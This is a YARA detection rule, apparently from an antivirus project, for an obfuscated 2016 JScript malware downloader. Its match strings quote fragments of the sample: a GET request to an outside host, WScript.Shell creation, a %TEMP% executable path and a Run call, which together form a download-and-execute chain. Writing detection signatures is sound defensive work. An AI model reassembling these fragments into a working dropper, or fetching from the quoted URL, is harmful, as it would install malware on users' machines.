rule sig_20160330_6fbf2e1cdb7ac63b0fb0d8db279c33df {
  meta:
    description = "datamaliciousorder - file 20160330_6fbf2e1cdb7ac63b0fb0d8db279c33df.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8740a87436e1297f3a1b0c1d0bac1c7eb1fbcbecff017de401db51be8e5fc538"

  strings:
    $s1  = "_D0[_V](\"GET\", \"http://shopyb.com/s6dlas\", false);" fullword ascii
    $s2  = "var _EO = function _Q() {return WScript[_EK](\"WScript\"+\".Shell\");}(), _EP = 11;" fullword ascii
    $s3  = "function _W(_XQ, _IH){_KK = _KK * 1; return _XQ - _IH;};" fullword ascii
    $s4  = "if (_D0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _OY() {return _EO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Ixpfxo71.ex\" + \"e\";};" fullword ascii
    $s6  = "function _I(){return _AO + \"\";};" fullword ascii
    $s7  = "function _D(_W0){_EO[\"Run\"](_W0, _KK, _KK);};" fullword ascii
    $s8  = "function _NM() {return ((_CJ == true) && (_CJ == _E0)) ? 1 : _KK;};" fullword ascii
    $s9  = "function _A()" fullword ascii
    $s10 = "var _M0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function _HJ(){return 22;};" fullword ascii
    $s12 = " while (_ZN){" fullword ascii
    $s13 = "function _LR(){return _EK;};" fullword ascii
    $s14 = "return _W(_B0, _S);" fullword ascii
    $s15 = "function _B(_GZ) {var _I1 = (1, 2, 3, 4, 5, _GZ); return _I1;};" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "var _E0 = false;" fullword ascii
    $s18 = "var _CJ = false;" fullword ascii
    $s19 = "_E0 = true; " fullword ascii
    $s20 = "_CJ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}